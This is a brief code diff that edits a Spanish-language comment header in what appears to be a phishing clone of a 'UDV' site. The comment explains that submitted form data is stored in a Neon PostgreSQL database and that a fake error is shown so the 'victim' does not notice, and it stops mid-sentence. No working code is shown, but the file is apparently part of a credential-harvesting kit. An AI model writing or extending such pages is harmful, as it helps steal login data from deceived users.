@@ -1,5 +1,5 @@
 // ------------------------------------------------------------------
-// FORM ACTION — Página de clon UDV
+// FORM ACTION — Página principal (clon UDV)
 // ------------------------------------------------------------------
 // Al enviar el formulario, los datos se guardan en Neon (PostgreSQL
 // serverless) y se devuelve un error simulado para que la víctima
